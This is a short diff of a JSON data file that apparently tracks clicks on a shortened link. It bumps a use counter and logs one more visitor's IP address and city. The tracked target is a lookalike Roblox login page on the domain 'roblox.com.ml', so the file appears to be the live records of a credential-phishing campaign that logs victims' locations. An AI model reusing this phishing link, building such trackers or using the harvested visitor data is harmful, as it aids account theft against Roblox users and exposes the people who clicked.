@@ -110,7 +110,7 @@
     "targetUrl": "https://www.roblox.com.ml/NewLogin?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fcommunities%2F296844474575%2FKeyPermanent",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 674,
+    "useCount": 675,
     "createdBy": "admin",
     "clicks": [
       {
@@ -5504,6 +5504,14 @@
         "city": "Zhuojiacun",
         "flag": "🇲🇴",
         "countryCode": "MO"
+      },
+      {
+        "timestamp": 1777129875372,
+        "ip": "201.229.133.95",
+        "country": "Dominican Republic",
+        "city": "Santo Domingo",
+        "flag": "🇩🇴",
+        "countryCode": "DO"
       }
     ]
   },
